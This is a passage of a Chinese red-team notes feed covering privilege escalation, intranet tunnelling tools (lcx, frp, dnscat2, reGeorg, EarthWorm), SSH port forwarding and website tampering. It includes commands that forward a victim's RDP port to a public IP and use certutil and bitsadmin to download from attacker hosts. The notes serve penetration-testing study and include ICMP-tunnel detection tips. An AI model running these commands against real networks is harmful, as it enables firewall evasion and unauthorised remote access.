class=\"language-bat\" data-ext=\"bat\" data-title=\"bat\"><pre class=\"language-bat\"><code>@echo off\nstart \"\" cmd /c waitfor 某个条件\n\n</code></pre></div><p>这将在新窗口中启动命令行并在后台运行 <code>waitfor</code> 命令。</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "3. 进程注入",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/3-Persistence/3_ProcessInjection.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/3-Persistence/3_ProcessInjection.html",
      "summary": "3. 进程注入",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1-Linux权限提升",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/4-PrivilegeEscalation/1_Linux.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/4-PrivilegeEscalation/1_Linux.html",
      "summary": "1-Linux权限提升\n\n[Linux 安全运维] 第三章 Linux 用户以及权限管理 - 知乎 (zhihu.com)\n\n1. Linux中的用户和组\n1.1 用户和组概念\n\n超级管理员（root）\n系统用户\n普通用户\n\n每个用户被分配一个唯一的用户标识符（UID），用于标识和管理用户。\n\nGID（组标识符）用于标识和管理用户所属的组。每个用户可以...",
      "content_html": "\n<blockquote>\n<p>[<a href=\"https://zhuanlan.zhihu.com/p/428433013?utm_id=0\" target=\"_blank\" rel=\"noopener noreferrer\">Linux 安全运维] 第三章 Linux 用户以及权限管理 - 知乎 (zhihu.com)</a></p>\n</blockquote>\n<h2>1. Linux中的用户和组</h2>\n<h3>1.1 用户和组概念</h3>\n<ul>\n<li>超级管理员（root）</li>\n<li>系统用户</li>\n<li>普通用户</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>[root@localhost ~]# id root\nuid=0(root) gid=0(root) groups=0(root)\n[root@localhost ~]#\n</code></pre></div><p>每个用户被分配一个唯一的用户标识符（UID），用于标识和管理用户。</p>\n<p>| 用户分类   | UID                                             |\n|</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2-Windows权限提升",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/4-PrivilegeEscalation/2_Windows.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/4-PrivilegeEscalation/2_Windows.html",
      "summary": "2-Windows权限提升",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "内网穿透-隧道",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/5-Intranet/Intranet_tunnel.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/5-Intranet/Intranet_tunnel.html",
      "summary": "内网穿透-隧道\n\n渗透测试之内网渗透（二）：内网穿透_渗透测试内网穿透各类工具使用情况-CSDN博客\n内网渗透系列：内网穿透（隧道）学习_隧道内网穿透-CSDN博客\n\n1. 内网穿透概述\n1.1 概述\n\n参考链接：https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E...",
      "content_html": "\n<blockquote>\n<p><a href=\"https://blog.csdn.net/m0_74131821/article/details/130322657\" target=\"_blank\" rel=\"noopener noreferrer\">渗透测试之内网渗透（二）：内网穿透_渗透测试内网穿透各类工具使用情况-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_44604541/article/details/118305353\" target=\"_blank\" rel=\"noopener noreferrer\">内网渗透系列：内网穿透（隧道）学习_隧道内网穿透-CSDN博客</a></p>\n</blockquote>\n<h2>1. 内网穿透概述</h2>\n<h3>1.1 概述</h3>\n<blockquote>\n<p>参考链接：https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/</p>\n</blockquote>\n<p>内网穿透：利用各种隧道技术，寻找防火墙允许的协议，混杂在正常流量中穿透，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p>\n<p>隧道技术：一种通过使用互联网络的基础设施在网络之间传递数据的方式，包括数据封装、传输和解包在内的全过程，使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。</p>\n<ul>\n<li>封装：隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递</li>\n<li>传输：被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道</li>\n<li>解包：一旦到达网络终点，数据将被解包并转发到最终目的地</li>\n</ul>\n<p>隧道协议的主要作用包括：<strong>规避防火墙</strong>、<strong>绕过出网协议的限制</strong>、<strong>加密网络流量</strong>。</p>\n<p>常见的隧道列举如下：</p>\n<ul>\n<li>应用层：SSH、HTTP、HTTPS、DNS。</li>\n<li>传输层：TCP、UDP、常规端口转发。</li>\n<li>网络层：IPv6、ICMP、GRE。</li>\n</ul>\n<blockquote>\n<p>关于木马通信使用的协议演变历史可参考：https://cloud.tencent.com/developer/article/1832949?from=article.detail.1419096</p>\n</blockquote>\n<h3>1.2 内网主机出网方式</h3>\n<h4>(1) ICMP协议出网</h4>\n<p>网络防火墙允许ICMP协议出网，即能ping通外网主机。判断是否允许ICMP协议出网的方式</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>ping ip/domain\ntracert ip/domain\n</code></pre></div><p>若只允许ICMP协议出网，可以通过ICMP隧道来解决，也可以解决IPS对HTTP等流量类型检测比较严格问题</p>\n<h4>(2) 传输层特定端口出网</h4>\n<p>网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。</p>\n<p>判断方式：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>telnet ip port   #TCP\nnc -zv ip port   #TCP\nnc -zuv ip port  #UDP\ncurl/wget certutil等判断http出网的话、TCP就能出网\n</code></pre></div><p>在一个不能出网的网络环境里面，将所有的TCP和UDP端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致：比如网络管理员配置允许Web服务器访问另一主机的mysql数据库的3306端口，网络管理员配置时偷懒，可能会直接放行Web服务器到任意IP的3306端口。</p>\n<p>这种情况就其实就属于能出网了，不需要网络隧道，只需要攻击者本地监听防火墙允许出网的端口，让目标主机将shell反弹到该端口即可。</p>\n<h4>(3) 特定的应用层协议出网</h4>\n<p>（比如HTTP、SSH、DNS等应用层协议）</p>\n<p>网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议</p>\n<p>判断方式-HTTP/HTTPS：(下面的URL中的http均可替换成https)</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>linux:\ncurl http://ip or domain\nwget http://ip or domain\n\nWindows: \nstart http://www.baidu.com\nexplorer http://www.baidu.com\ncertutil.exe -urlcache -split -f http://ip:port/xxx\nbitsadmin /transfer 任务名 http://ip:port/xxx 绝对路径\\文件名\n</code></pre></div><p>判断DNS出网</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>linux：\ndig @8.8.8.8 www.baidu.com\nnslookup www.baidu.com 8.8.8.8\n\nwindows：\nnslookup www.baidu.com 8.8.8.8\n</code></pre></div><p>判断SSH出网</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>netstat -ntlp |grep ssh\nssh -p 22 user@ip   #试一下就知道了\n</code></pre></div><h2>2. 隧道工具</h2>\n<h3>2.1 网络层隧道工具</h3>\n<blockquote>\n<p>ICMP协议出网</p>\n</blockquote>\n<h4>(1) 使用场景及原理</h4>\n<p><strong>使用场景</strong></p>\n<p>1）某主机只允许ICMP协议出网，只需要将ICMP隧道工具客户端放到目标主机上并执行</p>\n<p>2）防火墙不限制ICMP协议或检测能力较弱</p>\n<p>3）目标主机配置了微隔离(不禁ping，不出网，只有web服务的固定端口可访问)，只有一个webshell，想要上线其他C2工具</p>\n<p>4）用作权限维持，将攻击者的控制流量隐藏在ICMP流量中</p>\n<p><strong>原理</strong></p>\n<p>关于ICMP请求，Windows和Linux是不同的：</p>\n<ul>\n<li>\n<p>Windows系统默认传输32 bytes的数据，内容是固定的<code>abcdefghijklmnopqrstuvwabcdefghi</code>，ping包的大小是可以改变的，但是内容依旧不变，且请求和响应内容相同</p>\n</li>\n<li>\n<p>Linux系统默认传输48 bytes的数据，头信息比较复杂，但是末尾内容是固定<code>!”#$%&amp;’()+,-./01234567</code></p>\n</li>\n</ul>\n<p>下图报文142和143为Windows系统的Request和Reply包。</p>\n<figure><figcaption>image-20231024221510922</figcaption></figure>\n<figure><figcaption>image-20231024221606350</figcaption></figure>\n<p>下图报文7和10为Linux系统的Request和Reply包。</p>\n<figure><figcaption>image-20231024222915343</figcaption></figure>\n<figure><figcaption>image-20231024222949808</figcaption></figure>\n<p><strong>ICMP隐蔽隧道的原理</strong>：替换Data部分，利用客户端程序进行接收并处理服务端发送的畸形的ICMP协议（主要是Request和Reply包）</p>\n<p><strong>检测方式</strong>：</p>\n<ul>\n<li>检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道在同一时间会产生上千个 ICMP 数据包。</li>\n<li>寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。</li>\n<li>注意那些 ICMP 数据包中 payload 大于 64 比特的数据包（当然有的工具可以配置限制所有数据包的payload为64比特，这样会使得更难以被检测到）。</li>\n<li>检查ICMP数据包的协议标签，例如icmptunnel工具会在所有的payload前面增加<code>TUNL</code>标记以用于识别隧道，这就是特征。</li>\n</ul>\n<h4>(2) ICMP隧道工具</h4>\n<h5>ptunnel</h5>\n<p><a href=\"https://www.kali.org/tools/ptunnel/\" target=\"_blank\" rel=\"noopener noreferrer\">ptunnel | Kali Linux Tools</a></p>\n<p>kali自带，具体使用及其流量分析<strong>参考文档：<a href=\"/DailyNotes/CyberSecurity/RedTeam/5-Intranet/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html#_1-1-ptunnel\" target=\"_blank\">ICMP隧道-ptunnel</a></strong></p>\n<h5>pingtunnel</h5>\n<p>https://github.com/esrrhs/pingtunnel</p>\n<p>TCP、UDP、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用。</p>\n<p>可<strong>参考文档<a href=\"/DailyNotes/CyberSecurity/RedTeam/5-Intranet/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html#_1-2-pingtunnel\" target=\"_blank\">ICMP隧道-pingtunnel</a></strong></p>\n<h5>icmpsh</h5>\n<p>https://github.com/bdamele/icmpsh</p>\n<p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用。可参考：https://www.freebuf.com/news/210450.html</p>\n<h5>icmptunnel</h5>\n<p>https://github.com/DhavalKapil/icmptunnel</p>\n<p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p>\n<h3>2.1 传输层隧道工具</h3>\n<h4>(1) 使用场景</h4>\n<ul>\n<li>\n<p>内网IP无法直接访问</p>\n</li>\n<li>\n<p>只有特定端口出网</p>\n</li>\n</ul>\n<h4>(2) 传输层隧道工具</h4>\n<h5>netcat</h5>\n<p>官网：https://eternallybored.org/misc/netcat/</p>\n<h5>powercat</h5>\n<p>powershell版的netcat</p>\n<p>github：https://github.com/besimorhino/powercat</p>\n<h5>socat</h5>\n<p>具有记录转发流的功能，方便查看转发内容，需要安装</p>\n<p>github：https://github.com/erluko/socat</p>\n<h5>netsh</h5>\n<p>windows系统自带的网络配置工具</p>\n<p>官网：https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts</p>\n<h5>lcx</h5>\n<p>github：https://github.com/windworst/LCX</p>\n<p>下面是几条常用命令记录：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\"># 将lcx.exe上传到受害者主机上（内网机器192.168.1.123），将其3389端口转发到一个公网IP的8080端口。</span>\nlcx.exe <span class=\"token parameter variable\">-slave</span> <span class=\"token number\">11.11</span>.11.11 <span class=\"token number\">8080</span> <span class=\"token number\">192.168</span>.1.123 <span class=\"token number\">3389</span>\n<span class=\"token comment\"># 将本机端口8080上监听的所有数据转发到本机9000上</span>\nlcx.exe <span class=\"token parameter variable\">-listen</span> <span class=\"token number\">8080</span> <span class=\"token number\">9000</span>\n<span class=\"token comment\"># 此时攻击者访问127.0.0.1:9000即可访问到内网的远程桌面，从而突破了内网私有ip的限制。</span>\n\n<span class=\"token comment\"># 将本机端口9000上监听的所有数据转发到192.168.1.123的8080。跳板机上执行一下，可以直接访问到内网的对应站点了</span>\nlcx.exe <span class=\"token parameter variable\">-tran</span> <span class=\"token number\">9000</span> <span class=\"token number\">192.168</span>.1.123 <span class=\"token number\">8080</span>\n</code></pre></div><h5>NATBypass</h5>\n<p>一款lcx在golang下的实现，命令和上面的lcx一样</p>\n<p>github：https://github.com/cw1997/NATBypass</p>\n<h5>iox</h5>\n<p>端口转发 &amp; 内网代理工具，功能类似于lcx/ew，<strong>简化了命令行参数</strong>，支持UDP流量转发，支持流量加密。不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p>\n<p>github：https://github.com/EddieIvan01/iox</p>\n<h5>frp</h5>\n<p>用Go写的，支持TCP、UDP、HTTP、HTTPS协议，同时也支持P2P，仍在持续更新</p>\n<p>github：https://github.com/fatedier/frp</p>\n<h3>2.3 应用层隧道工具</h3>\n<h4>(1) 使用场景</h4>\n<p>特定的应用层协议出网，主要还是DNS隧道和socks代理</p>\n<h4>(2) 应用层隧道工具</h4>\n<p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等</p>\n<h5>ssh</h5>\n<p>ssh本身可以用来做隧道，如果没被限制的话</p>\n<p>构建ssh隧道的常用参数:</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>-C 压缩传输，提高传输速度\n-f 后台执行数据传输\n-N 建立静默连接\n-g 允许远程主机连接本地用于转发的端口\n-L 本地端口转发\n-R 远程端口转发\n-D 动态转发，即SOCKS代理\n-p 指定ssh连接端口\n</code></pre></div><p><strong>本地转发：</strong></p>\n<p>用法1：本地端口映射到远程。在 HostB 上运行</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>HostB$ <span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-CNfg</span> <span class=\"token parameter variable\">-L</span> PortB:HostC:PortC user@HostC\n<span class=\"token comment\"># HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，</span>\n</code></pre></div><p>这时访问 HostB:PortB 相当于访问 HostC:PortC（和 iptable 的 port-forwarding 类似）。</p>\n<p>用法2：本地端口通过跳板映射到其他机器。在 HostA 上运行：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>HostA$ <span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-CNfg</span> <span class=\"token parameter variable\">-L</span> PortA:HostC:PortC  user@HostB\n<span class=\"token comment\"># HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC上，</span>\n</code></pre></div><p>这时访问 HostA:PortA 相当于访问 HostC:PortC。</p>\n<p>两种用法的区别是，第一种用法本地到跳板机 HostB 的数据是明文的，而第二种用法一般本地就是 HostA，访问本地的 PortA，数据被 ssh 加密传输给 HostB 又转发给 HostC:PortC。</p>\n<p>**远程转发：**让远端启动端口，把远端端口数据转发到本地。</p>\n<p>HostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>HostA$ <span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-CNfg</span> <span class=\"token parameter variable\">-R</span> HostC:PortC:HostB:PortB  user@HostC\n<span class=\"token comment\"># HostA的ssh服务端监听7777, 将收到的tcp数据包通过连接到HostB的ssh隧道，转发到HostC:PortC，效果是访问HostA本地的7777就相当于访问HostC:PortC</span>\n</code></pre></div><p>那么链接 HostC:PortC 就相当于链接 HostB:PortB。使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>GatewayPorts <span class=\"token function\">yes</span>\n</code></pre></div><blockquote>\n<p>相当于-L参数区别：比如 HostA 和 HostB 是同一个内网下的两台可以互相访问的机器，HostC是外网跳板机，HostC不能访问 HostA，但是 HostA 可以访问 HostC。那么通过在内网 HostA 上运行 <code>ssh -R</code> 告诉 HostC，创建 PortC 端口监听，把该端口所有数据转发给我（HostA），我会再转发给同一个内网下的 HostB:PortB。</p>\n</blockquote>\n<p>同内网下的 HostA/HostB 也可以是同一台机器，换句话说就是<strong>内网 HostA 把自己可以访问的端口暴露给了外网 HostC</strong>。</p>\n<p>**动态转发：**socks代理</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-CNfg</span> <span class=\"token parameter variable\">-D</span> <span class=\"token number\">127.0</span>.0.1:7777 root@192.168.1.1\n<span class=\"token comment\"># ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址，也就是只要知道一个内网主机的密码，就可以用它上面的ssh服务转发流量了。</span>\n</code></pre></div><h5>dns2tcp</h5>\n<p><strong>实际使用记录：<a href=\"/DailyNotes/CyberSecurity/RedTeam/5-Intranet/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html#_2-2-dns2tcp\" target=\"_blank\">DNS隧道-dns2tcp</a></strong></p>\n<p>TCP over DNS，即通过DNS隧道转发TCP连接，没有加密。采用直连，但速度不是特别乐观，优势在于kali直接集成了这个工具，部分linux发行版也都可以直接通过包工具下载，相对方便</p>\n<p>github：https://github.com/alex-sector/dns2tcp</p>\n<p>可参考：https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096</p>\n<h5>iodine</h5>\n<p><strong>实际使用记录：<a href=\"https://echo0d.github.io/DailyNotes/AD/Tools/Tunnel.html#_2-1-iodine\" target=\"_blank\" rel=\"noopener noreferrer\">DNS隧道-iodine</a></strong></p>\n<p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包，在编码，请求类型上提供了更丰富的选择，而且在速度方面更快github：https://github.com/yarrick/iodine</p>\n<p>可参考： https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096</p>\n<h5>dnscat2</h5>\n<p>IP over DNS通过 DNS 协议创建加密的命令和控制 (C&amp;C) 通道</p>\n<p>github：https://github.com/iagox86/dnscat2</p>\n<p>可参考：https://cloud.tencent.com/developer/article/1474644?from=article.detail.1552172\nhttps://cloud.tencent.com/developer/article/1419096</p>\n<h5>dnscat2-powershell</h5>\n<p>dnscat2的powershell客户端</p>\n<p>github：https://github.com/lukebaggett/dnscat2-powershell</p>\n<h5>reGeorg</h5>\n<p>github：https://github.com/sensepost/reGeorg</p>\n<p>SOCKS over HTTP，即通过HTTP隧道转发SOCKS，用Python写的，基于Python2.7和urllib3，上传一个tunnel脚本（提供了ashx, aspx, js, jsp, php），然后远程连接转发端口即可建立socket代理隧道，例如</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>$ python reGeorgSocksProxy.py <span class=\"token parameter variable\">-p</span> <span class=\"token number\">8080</span> <span class=\"token parameter variable\">-u</span> http://upload.sensepost.net:8080/tunnel/tunnel.jsp\n</code></pre></div><h5>Neo-reGeorg</h5>\n<p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p>\n<p>github：https://github.com/L-codes/Neo-reGeorg</p>\n<h5>reDuh</h5>\n<p>TCP over HTTP,即通过HTTP隧道转发TCP连接</p>\n<p>github：https://github.com/sensepost/reDuh</p>\n<h5>Tunna</h5>\n<p>TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS</p>\n<p>github：https://github.com/SECFORCE/Tunna</p>\n<h5>ABPTTS</h5>\n<p>TCP over HTTP，即通过HTTP隧道转发TCP连接</p>\n<p>github：https://github.com/nccgroup/ABPTTS</p>\n<h5>EarthWorm（EW）</h5>\n<p>十分方便的多级SOCKS代理</p>\n<p>官网：http://rootkiter.com/EarthWorm/</p>\n<p>github：https://github.com/rootkiter/Binary-files</p>\n<p>下载：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code># 5种管道\nssocksd : 正向代理\nrssocks : 反向代理\nlcx_slave： 该管道一侧通过反弹方式连接代理请求，另一侧连接代理提供主机\nlcx_tran : 该管道通过监听本地端口代理请求，并转发给代理提供主机\nlcx_listen : 该管道通过监听本地端口接收数据，并将其转发给目标网络回连的代理提供主机\n</code></pre></div><h5>Termite</h5>\n<p>EarthWorm的升级版，已经永久停止更新</p>\n<p>官网：http://rootkiter.com/Termite/</p>\n<p>github：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e</p>\n<h5>Venom</h5>\n<p>Venom是一款基于ssh隧道，为渗透测试人员设计的使用Go开发的多级代理工具</p>\n<p>github：https://github.com/Dliv3/Venom/</p>\n<h5>ssocks</h5>\n<p>github：https://github.com/54Pany/sSocks</p>\n<p>正向和反向的socks工具，可执行文件的大小很小，支持socks5验证，支持IPV6和UDP</p>\n<h5>s5.go</h5>\n<p>go语言编写的socks服务工具，良好的跨平台特性</p>\n<p>github：https://github.com/ring04h/s5.go</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "网站篡改",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/6-Emergency/Tamper.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/6-Emergency/Tamper.html",
      "summary": "网站篡改\n以开源的php网站为例：https://github.com/geeeeeeeek/dingfanzu。\n将代码下载并解压，放在phpstudy的WWW目录下：\nimg0img0\n1. 网站被植入webshell\n网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了...",
      "content_html": "\n<p>以开源的php网站为例：https://github.com/geeeeeeeek/dingfanzu。</p>\n<p>将代码下载并解压，放在phpstudy的WWW目录下：</p>\n<figure><figcaption>img0</figcaption></figure>\n<h2>1. 网站被植入webshell</h2>\n<p>网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，SQL注入写入文件等。</p>\n<p>一般获得webshell是网站篡改的前提。</p>\n<p>发现网站被篡改后，想要手动发现webshell文件，可以查看网站被篡改文件的访问日志，发现可疑的IP，确定了篡改网站的IP后，再看该IP访问了哪些文件，其中就有可能包含webshell文件。</p>\n<h2>2. 网站挂黑链</h2>\n<h3>2.1 黑链及其危害</h3>\n<p>黑链是搜索引擎优化（SEO）手法中相当普遍的一种手段， 这种技术正在成为黑客获利的常用手段，简单来说即通过入侵篡改他人网站，植入暗链代码，劫持他人网站流量，用作不法内容宣传，从而获利。</p>\n<p>最常见的黑链就是通过各种网站程序漏洞获取搜索引擎权重较高网站的WebShell，进而在被黑网站上链接自己的网站，是一种为高效率提升排名而使用的作弊手法。政府和企业的官方网站、知名媒体平台是黑客最喜欢的植入对象，因为这些网站关注度高，流量劫持成功的收益巨大。</p>\n<p>通常来讲，受害主机存在以下两个明显的危害：</p>\n<ul>\n<li>组织单位社会形象严重受损</li>\n</ul>\n<p>存在漏洞的搜索引擎权重或者PR较高的网站容易被植入博彩、色情、游戏等黑链，当访问者点击被挂黑链网站时，会被引导到相关的博彩、色情网站，使组织单位的社会形象受损，网站运营者甚至要承担相应的法律责任。</p>\n<ul>\n<li>严重影响网站的推广</li>\n</ul>\n<p>被挂黑链网站由于存在太多单向链接，会造成网站快照更新慢、网站排名下降等问题。而网站一旦被搜索引擎发现黑链行为，会被降权或者从关键词排名剔除，非常损害网站的推广。</p>\n<p>同时，黑链已经被植入受害主机，表明主机很可能已被黑客控制，现有的安全防护体系已经部分甚至完全失效，还存在以下潜在风险：</p>\n<ul>\n<li>组织单位遭受更进一步的损失</li>\n</ul>\n<p>攻击者可以进一步对网站实行挂马、信息篡改、信息窃取和信息监控，严重威胁用户网站的安全，导致企事业单位遭受更进一步的资产损失。</p>\n<ul>\n<li>遭受监管单位通报</li>\n</ul>\n<p>黑客将恶意程序植入受害主机，控制主机作为“肉鸡”攻击互联网上的其他单位，违反网络安全法，遭致网信办、网安等监管单位的通报处罚。</p>\n<h3>2.2 挂黑链方法</h3>\n<p>黑链一般为暗链，因为明链极易被网站管理员或用户发现。</p>\n<ul>\n<li><strong>明链</strong></li>\n</ul>\n<p>明链是指顾客在网站页面可以清楚查寻的连接，它一般重要是指网站底部可以看到的<strong>友情链接</strong>，也许网站內部的频道连接、内部链接等可以称之为明链。</p>\n<p>例如在订餐网站首页添加好评返现的链接：</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>login fl<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header-operater<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>链接<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>友情链接/好评返现<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>外卖<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://www.baidu.com<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>我的订单<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/about.html?p=lianxiwomen<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>联系我们<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span> \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span> \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header-login<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>navBtn f-radius f-select n<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">data-reveal-id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>myModal<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">data-animation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 